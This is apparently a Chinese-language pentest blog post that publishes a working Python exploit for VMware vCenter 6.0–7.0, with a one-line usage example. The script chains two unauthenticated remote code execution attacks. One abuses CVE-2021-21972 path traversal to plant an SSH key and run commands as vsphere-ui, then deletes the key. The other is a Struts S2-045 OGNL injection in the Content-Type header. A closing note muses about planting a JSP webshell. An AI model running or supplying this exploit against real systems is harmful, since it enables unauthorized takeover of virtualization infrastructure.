---
title: vCenter RCE
author: Admin
date: 2021-02-24 20:21:00 +0800
categories: [渗透测试, 内网]
tags: [vsphere, vcenter, vmware]
---

# 开宗明义

两个前台rce，通杀6.0-7.0版本。对于CVE-2021-21972，请自行生成公私钥填入脚本中。

# poc

```python
import io
import sys
import tarfile
import requests
import paramiko
from http import client
client.HTTPConnection._http_vsn = 10
client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
requests.packages.urllib3.disable_warnings()

# 公钥
pub = ''
# 私钥
pri = '''-----BEGIN OPENSSH PRIVATE KEY-----
xxx
----END OPENSSH PRIVATE KEY-----
'''


def create_tar(file_dict: dict) -> io.BytesIO:
    tar: tarfile.TarFile = tarfile.open(mode="w", fileobj=(t := io.BytesIO()))
    for key in file_dict.keys():
        tarinfo: tarfile.TarInfo = tarfile.TarInfo(name=key)
        f: io.BytesIO = io.BytesIO(file_dict[key].encode())
        tarinfo.size = len(f.read())
        f.seek(0)
        tar.addfile(tarinfo, fileobj=f)
    tar.close()
    return t


def exec_command(ip: str, shell: str) -> tuple:
    ssh: paramiko.SSHClient = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(
        hostname=ip,
        port=22,
        username='vsphere-ui',
        pkey=paramiko.RSAKey.from_private_key(file_obj=io.StringIO(pri))
    )
    return ssh.exec_command(shell)


def poc_6_5__7(url: str, shell: str) -> bool:
    base_url: str = "/ui/vropspluginui/rest/services/uploadova"
    tar_file: io.BytesIO = create_tar({"../../home/vsphere-ui/.ssh/authorized_keys": pub})
    tar_file.seek(0)
    files: dict = {
        'uploadFile': (
            'a.tar',
            tar_file.read(),
            'tar'
        )
    }
    r: requests.Response = requests.post(url + base_url, files=files, verify=False)
    if r.text != 'SUCCESS':
        return False
    else:
        print()
        stdin, stdout, stderr = exec_command((ip := url.split('/')[2]), shell)
        print('[+] output:')
        print(stdout.read().decode())
        print(stderr.read().decode())
        exec_command(ip, 'rm /home/vsphere-ui/.ssh/authorized_keys')
        return True


def poc_6_0(url: str, shell: str) -> bool:
    base_url: str = "/statsreport/"
    header: dict = {
        "Content-Type": "%{(#xxx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).("
                        "#_memberAccess?(#_memberAccess=#dm):((#container=#context["
                        "'com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance("
                        "@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear("
                        ")).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='",
    }
    header["Content-Type"] = header["Content-Type"] + shell
    header["Content-Type"] = header["Content-Type"] + "').(#iswin=(@java.lang.System@getProperty(" \
                                                      "'os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{" \
                                                      "'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new " \
                                                      "java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(" \
                                                      "true)).(#process=#p.start()).(#ros=(" \
                                                      "@org.apache.struts2.ServletActionContext@getResponse(" \
                                                      ").getOutputStream())).(@org.apache.commons.io.IOUtils@copy(" \
                                                      "#process.getInputStream(),#ros)).(#ros.flush())} "
    r: requests.Response = requests.get(url + base_url, headers=header, verify=False)
    if len(r.text) != 0 and r.status_code != 404:
        print()
        print('[+]output: ')
        print(r.text)
        return True
    else:
        return False


if __name__ == '__main__':
    print('[+] url: ' + (url := sys.argv[1]))
    print('[+] cmd: ' + (cmd := ' '.join(sys.argv[2:])))
    sys.stdout.write('[*] check poc for vcenter 6.0  (S2-045)')
    if poc_6_0(url, cmd):
        exit()
    else:
        sys.stdout.write(' ...failed!')
        print()
    sys.stdout.write('[*] check poc for vcenter 6.5-7.0 (CVE-2021-21972)')
    if poc_6_5__7(url, cmd):
        exit()
    else:
        sys.stdout.write(' ...failed!')
        print()
    print()
    print('[-] no dong')

```

# 用法

```shell
> python3.9 vcenter_rce.py https://xxx.xxx.xxx.xxx whoami
```

# TODO

对于CVE-2021-21972本来想找个地方写jsp的，但是没找到通杀位置。写ssh公私钥也能凑合用，有时间再填坑。咕咕咕...
